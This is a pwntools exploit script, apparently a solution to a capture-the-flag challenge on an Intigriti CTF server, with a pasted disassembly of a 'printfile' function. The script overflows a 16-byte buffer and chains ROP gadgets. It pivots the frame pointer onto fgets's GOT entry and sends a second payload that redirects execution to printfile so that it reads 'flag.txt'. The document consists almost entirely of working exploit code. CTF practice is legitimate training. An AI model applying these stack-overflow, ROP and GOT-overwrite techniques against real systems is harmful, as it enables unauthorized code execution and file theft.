from pwn import *

gs = '''
b *main+31
continue
'''

"""
pwndbg> disass printfile 
Dump of assembler code for function printfile:
   0x000000000040115d <+0>:	    endbr64
   0x0000000000401161 <+4>: 	push   rbp
   0x0000000000401162 <+5>: 	mov    rbp,rsp
   0x0000000000401165 <+8>:	    mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401169 <+12>:	mov    rax,0x2
   0x0000000000401170 <+19>:	mov    rsi,0x0
   0x0000000000401177 <+26>:	syscall
   0x0000000000401179 <+28>:	mov    rsi,rax
   0x000000000040117c <+31>:	mov    rdi,0x1
   0x0000000000401183 <+38>:	mov    rdx,0x0
   0x000000000040118a <+45>:	mov    r8,0x100
   0x0000000000401191 <+52>:	mov    rax,0x28
   0x0000000000401198 <+59>:	syscall
   0x000000000040119a <+61>:	nop
   0x000000000040119b <+62>:	pop    rbp
   0x000000000040119c <+63>:	ret
"""

elf = context.binary = ELF("./vuln")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['kitty', '--']
io = start()

gadget = 0x00000000004010a6
flag_txt = u64(b"flag.txt")

offset = 16

rop = ROP(elf)

pop_rbp = rop.find_gadget(['pop rbp'])[0]

payload = b"".join([
    b"A"*offset,
    p64(pop_rbp),
    p64(elf.got.fgets + 0x8),
    p64(elf.sym.fgets)
])

io.sendline(payload)

payload = b"".join([
    p64(elf.sym.printfile),
    p64(0x0),
    p64(pop_rbp),
    p64(elf.got.fgets + 0x30),
    p64(elf.sym.fgets),
    b"flag.txt",
    p64(0x0)
])

io.sendline(payload)

io.interactive()